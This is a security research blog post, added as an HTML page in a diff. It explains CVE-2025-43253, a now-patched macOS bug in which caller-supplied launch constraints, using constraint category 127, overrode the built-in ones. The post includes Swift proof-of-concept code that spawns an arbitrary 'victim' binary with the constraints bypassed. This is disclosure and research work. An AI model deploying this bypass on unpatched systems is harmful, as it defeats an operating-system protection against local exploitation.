@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en" prefix="og: https://ogp.me/ns#">
+
+<head>
+  <!-- -- Common -- -->
+  <base target="_blank" />
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="referrer" content="no-referrer">
+  <meta http-equiv="Content-Security-Policy" content="
+      default-src 'none';
+      style-src https://fonts.googleapis.com/ 'self';
+      font-src https://fonts.gstatic.com/;
+      img-src 'self';
+      form-action 'none'
+      " />
+  <link rel="icon" href="/favicon.png" />
+  <link rel="stylesheet" href="/style.css" />
+  <!-- Mastadon Attribution -->
+  <meta name="fediverse:creator" content="@wtsdev@infosec.exchange">
+  <!-- Twitter/X use the standard "name" attribute -->
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@wtsdev" />
+  <meta name="twitter:creator" content="@wtsdev" />
+  <!-- Facebook/OpenGraph use the non-standard "property" attribute -->
+  <meta property="og:site_name" content="Watch This Space" />
+  <meta property="og:image" content="https://wts.dev/favicon.png" />
+  <meta property="og:image:secure_url" content="https://wts.dev/favicon.png" />
+  <meta property="og:image:type" content="image/png" />
+  <meta property="og:image:width" content="512" />
+  <meta property="og:image:height" content="512" />
+  <meta property="og:image:alt" content="A large purple letter W on a light tan background" />
+  <!-- -- Page-Specific -- -->
+  <!-- Styles -->
+  <link rel="stylesheet" href="/post.css" />
+  <!-- URL -->
+  <link rel="canonical" href="https://wts.dev/posts/bypassing-launch-constraints/" />
+  <meta property="og:url" content="https://wts.dev/posts/bypassing-launch-constraints/" />
+  <!-- Title -->
+  <meta name="og:title" content="CVE-2025-43253: Bypassing Launch Constraints on macOS | Watch This Space" />
+  <title>CVE-2025-43253: Bypassing Launch Constraints on macOS | Watch This Space</title>
+  <!-- Description -->
+  <meta name="description" content="A security research blog." />
+  <meta property="og:description" content="A security research blog." />
+  <!-- Additional -->
+  <meta property="og:type" content="article" />
+  <!-- Author -->
+  <meta property="article:author" content="https://github.com/nmggithub" />
+  <meta name="author" content="Noah Gregory" />
+  <!-- Keywords -->
+  <meta name="keywords" content="security,macos,launch constraints,cve-2025-43253" />
+  <meta property="article:tag" content="security,macos,launch constraints,cve-2025-43253" />
+</head>
+
+<body>
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 itemprop="headline">CVE-2025-43253: Bypassing Launch Constraints on macOS</h1>
+      <div id="about">
+        <time itemprop="datePublished" datetime="2025-07-31">2025-07-31</time>
+        <address itemprop="author" itemscope itemtype="https://schema.org/Person">by <a itemprop="email" title="Send me and email" href="mailto:noah@wts.dev"><span itemprop="name">Noah Gregory</span></a>
+        </address>
+      </div>
+    </header>
+    <h2>What are launch constraints?</h2>
+    <p>Quick(er) one today! As covered by Csaba Fitzl in <a href="https://theevilbit.github.io/posts/amfi_launch_constraints/">his initial article on the topic</a> and <a href="https://theevilbit.github.io/posts/launch_constraints_deep_dive/">his later follow-up deep-dive</a>, <b>launch constraints</b> are a feature on macOS that stops binaries from being launched unless certain conditions are met. To be a bit pedantic, the constraints in question here are referred to by Apple as <b><a href="https://developer.apple.com/documentation/LightweightCodeRequirements">lightweight code requirements</a></b> (which is sometimes initialized as LWCR).</p>
+    <p><a href="https://developer.apple.com/documentation/security/defining-launch-environment-and-library-constraints">Lightweight code requirements are often expressed as a dictionary of conditions that should be true in order for the process to launch.</a> As explained in the previously-linked article, these constraints can be either <b>self constraints</b> (such as an <code>on-system-volume</code> constraint on system processes to ensure they can't be copied to a temporary directory and launched) or <b>parent constraints</b> (such as an <code>is-init-proc</code> constraint on daemons to ensure that only the init proc can launch them).</p>
+    <p>These constraints are powerful tools that can essential mitigate entire classes of exploits. If a binary can only be launched under certain conditions, and those conditions are tight enough to where an attacker cannot gain a foothold, the binary becomes very difficult to exploit. Previously attacks, such as <a href="https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/">copying a system app with plugin support to a temporary directory, modifying it, and then giving it a malicious plugin,</a> can be thoroughly prevented. They're a very good and important feature. So let's break them!</p>
+    <h2>Breaking launch constraints</h2>
+    <h3>Finding the vulnerability</h3>
+    <p>But first, I need to explain how I found this vulnerability. I was working on my <b><a href="https://github.com/nmggithub/Kass">Kass</a></b> tooling, a set of Swift wrappers around lower-level kernel API's I wrote to help me in reverse engineering. I was writing a wrapper around <a href="https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man2/posix_spawn.2.html"><code>posix_spawn()</code></a> by looking through <a href="https://github.com/apple-oss-distributions/xnu/blob/xnu-11417.101.15/libsyscall/wrappers/spawn/posix_spawn.c">the source code of <code>libsyscall</code> in the XNU sources.</a> This introduced me to <a href="https://github.com/apple-oss-distributions/xnu/blob/xnu-11417.101.15/libsyscall/wrappers/spawn/posix_spawn.c#L2284">the <code>posix_spawnattr_setmacpolicyinfo_np</code> function,</a> which attaches an arbitrary blob of data and a string policy name to a call to <code>posix_spawn()</code> through the use of <b>spawn attributes</b>.</p>
+    <h3>Tracing the code</h3>
+    <p>The XNU kernel underpinning macOS includes a copy of the <b><a href="http://www.trustedbsd.org/mac.html">TrustedBSD MAC Framework.</a></b> <b>MAC policies</b> can register themselves with a list of hooks into specific operations (such as when a process spawns / is spawning), giving them the chance to weigh in on the context of these operations and provide feedback on the security implications. <a href="https://github.com/apple-oss-distributions/xnu/blob/xnu-11417.101.15/security/mac_policy.h#L574">One of these hooks functions, <code>mpo_proc_check_launch_constraints_t</code>, allows these policies to check the launch constraints of a binary as its spawning.</a></p>
+    <p>More specifically, <a href="https://github.com/apple-oss-distributions/xnu/blob/xnu-11417.101.15/security/mac_process.c#L920">the <code>mac_proc_check_launch_constraints</code> wrapper function iterates over registered MAC policies and calls the hook function by passing it a blob of data.</a> And, as many may have already correctly guessed, <a href="https://github.com/apple-oss-distributions/xnu/blob/xnu-11417.101.15/bsd/kern/kern_exec.c#L7943">that wrapper function is called in the initial stages of process execution in the kernel,</a> and <a href="https://github.com/apple-oss-distributions/xnu/blob/xnu-11417.101.15/security/mac_process.c#L926">the data that is passed to the hook function is taken directly from spawn attributes.</a></p>
+    <h3>Exploiting MAC policies</h3>
+    <p>So now we have a userspace API that allows us to pass an arbitrary blob of data to a specific MAC policy for it to parse however it is designed to. How can we abuse this? You might think this exploit involves a very specifically-crafted payload that leads to memory corruption that changes the flow of execution, but the actual exploit is far more simple. Believe me, if I had found a such a memory corruption exploit in the kernel I'd likely have far greater capabilities than simply bypassing launch constraints.</p>
+    <p>The actual vulnerability: pass an actual launch constraints dictionary. <em>That's it.</em> Well, it's a little more complicated than that, but the gist of it is that whatever launch constraints you passed in via this API would take the place of any in-built launch constraints. So you could simply pass it a very minimal set of constraints, and the kernel would check against those constraints instead of the OS's more strict built-in ones. Now that Apple has patched this, both sets of constraints are checked, mitigating this exploit.</p>
+    <h2>Proof-of-Concept</h2>
+    <p>In order to exploit this vulnerability, we first need to know how to serialize a launch constraints dictionary into a blob of data. While this could have been complicated, the OS thankfully includes an undocumented library we can use for this purpose. The below code uses the <code>Linking</code> modules from my Kass tooling to bring link in that library, but you can likely just as easily call <a href="https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man3/dlopen.3.html"><code>dlopen()</code></a> to dynamically link in the library.</p>
+    <pre><code>import Foundation
+import Linking
+
+@objc protocol ILWCR: NSObjectProtocol, Sendable {
+    var externalRepresentation: Data { get }
+    var dictionary: [String: Any] { get }
+    @objc(withVersion:withConstraintCategory:withRequirements:withError:)
+    static func
+        lwcr(
+            version: Int, constraintCategory: Int, requirements: [String: Any]?,
+            error: NSErrorPointer
+        ) -> Self?
+    @objc(withData:withError:)
+    static func lwcr(data: Data, error: NSErrorPointer) -> Self?
+}
+
+let LWCR: ILWCR.Type = {
+    Library(path: "/usr/lib/libTLE.dylib")!.link()
+    return unsafeBitCast(NSClassFromString("LWCR"), to: ILWCR.Type.self)
+}()</code></pre>
+  <p>Next, we can use my <code>posix_spawn()</code> wrapper API to define an extension that adds a serialized dictionary to a set of spawn attributes. But first, I need to explain something I didn't mention above: we don't actually have to pass a valid launch constraints dictionary. It has to be syntactically valid, enough for AMFI to parse it out, but the actual constraints don't have to be valid as there is a secondary parameter called the <b>constraint category</b>. If that value is 127, the constraints are parsed, but not enforced. Why that number? I don't know.</p>
+  <p>It's actually quite lucky, as AMFI only allows a certain subset of constraint categories for launch constraints to be passed in spawn attributes. Additionally, there is a specifc subset of constraint categories that are enforced. 127 just happens to be both allowed with this and not enforced. In Csaba's intital article on launch constraints, he shows off the log message that appears when AMFI enforces launch constraints on a binary: <code>AMFI: Launch Constraint Violation (enforcing) [...]</code>. You might think its strange that a log message indicates that a violation <em>is</em> indeed being enforced. That is, until you see what happens when you use constraint category 127: <code>AMFI: Launch Constraint Violation (not enforcing) [...]</code>.</p>
+  <pre><code>import BSDCore
+import Foundation
+
+extension BSDCore.BSD.POSIXSpawnAttributes {
+    func bypassLaunchConstraints() throws {
+        var error: NSError? = nil
+        guard
+            let lwcr = LWCR.lwcr(
+                version: 1,
+                // It seems that a constraint category of 127 will tell AMFI to not enforce any launch constraint errors.
+                constraintCategory: 127,
+                // AMFI will complain that this is empty, but because we pass 127 above it will still let us spawn.
+                requirements: [:],
+                error: &error
+            )
+        else { throw error! }
+        try self.setMACPolicyInfo(
+            policyName: "AMFI",
+            policyData: lwcr.externalRepresentation
+        )
+    }
+}</code></pre>
+  <p>Now to put it all together, we just call my <code>posix_spawn()</code> wrapper with these spawn attributes.</p>
+  <pre><code>func spawnWithNoLaunchConstraints(victimPath: String) throws {
+    let spawnAttributes = try BSDCore.BSD.POSIXSpawnAttributes()
+    try spawnAttributes.bypassLaunchConstraints()
+    let pid = try BSDCore.BSD.posixSpawn(
+        path: victimPath,
+        fileActions: BSDCore.BSD.POSIXSpawnFileActions(),
+        attributes: spawnAttributes,
+        arguments: [victimPath],
+        environmentVariables: [:]
+    )
+    print("Spawned process with pid \(pid) | \(victimPath)")
+}</code></pre>
+  <h2>Exploitability</h2>
+  <p>So how exploitable is this, really? To be honest, I'm not sure. I tried playing around with daemons, spawning them under certain conditions, but was never able to fully compromise one. Additionally, while Csaba found out about launch constraints when they blocked his attempt to copy an app to a different folder and run it, this bypass does not re-allow such exploits. Other OS security features, such as <b>AppleSystemPolicy</b> (the OS's built-in anti-virus), appear to pick up the slack and still block such exploits. It's still possible there was some way this exploit could be used to malicious ends, but I was ultimately unable to find a full exploit chain.</p>
+  <h2>A final technical note</h2>
+  <p>There's one more thing I've been holding back on in this article until now. All of this is actually possible because AMFI now ships with the option for <b>third party launch constraints</b> enabled by default. If that option were turned off, AMFI would simply ignore any launch constraints passed in via spawn attributes. If you're curious, you can tun <code>sysctl security.mac.amfi.launch_constraints_3rd_party_allowed</code> in your terminal to see the status of this option on your machine.</p>
+  <p>Interestingly, in Csaba's second article he incidentally revealed that the option was off for him at the time of writing. This initially lead me to believe the root of this vulnerability was that the option was turned on at some point. However, that was not the conclusion Apple seemingly came to. The option is still enable post-patch. The logic for handling launch constraints has simply changed. As mentioned, now both the spawn-attribute-passed constraints and the built-in constraints are checked by AMFI.</p>
+  <h2>What about CVE-2025-43266?</h2>
+  <p>Those of you who follow my work may have noticed this is not the only CVE I had for this most recent Apple update cycle. CVE-2025-43266 was the second one. To respond to those wondering when I am going to publish my write-up on that: I don't know. My research into that bug lead me down a rabbit-hole that exploded in several different directions and I'm still parsing through how (and even if) it all fits together. There's also external factors that make me uncomfortable with disclosing specific details of that vulnerability, so until those are resolved, there likely will not be a write-up for it on my blog.</p>
+      <p>Anyways, to stay informed on that (and anything else I put out) remember to <a target="_self" href="/feed.xml">watch this space.</a></p>
+  </article>
+</body>
+
+</html>
